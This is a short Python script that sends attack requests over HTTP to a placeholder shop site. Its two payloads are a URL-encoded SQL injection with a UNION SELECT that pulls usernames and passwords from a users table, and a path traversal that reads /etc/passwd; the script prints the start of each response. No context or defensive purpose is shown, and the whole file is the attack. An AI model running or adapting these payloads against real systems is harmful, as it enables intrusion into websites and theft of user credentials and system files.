import http.client
TARGET = "shop.example.com"
PAYLOADS = [
  "/?id=1%27%20OR%20%271%27%3D%271%27%20UNION%20SELECT%20username,password%20FROM%20users--",
  "/?file=../../../../etc/passwd",
]
for path in PAYLOADS:
    c = http.client.HTTPConnection(TARGET, 80, timeout=3)
    c.request("GET", path)
    print(c.getresponse().read()[:200])
